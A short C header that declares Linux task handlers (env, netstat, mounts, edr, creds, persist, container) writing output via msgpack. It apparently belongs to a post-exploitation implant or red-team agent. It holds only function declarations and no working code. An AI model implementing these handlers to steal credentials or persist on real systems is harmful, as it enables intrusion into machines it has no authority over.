#ifndef TASKS_LINUX_H
#define TASKS_LINUX_H

#include "msgpack.h"
#include <stdint.h>

/// Linux-specific command handlers
/// env, netstat, mounts, edr, creds, persist, container

int task_env(mp_writer_t *w);
int task_netstat(mp_writer_t *w);
int task_mounts(mp_writer_t *w);
int task_edr(mp_writer_t *w);
int task_creds(const uint8_t *data, uint32_t data_len, mp_writer_t *w);
int task_persist(const uint8_t *data, uint32_t data_len, mp_writer_t *w);
int task_container(const uint8_t *data, uint32_t data_len, mp_writer_t *w);

#endif /* TASKS_LINUX_H */
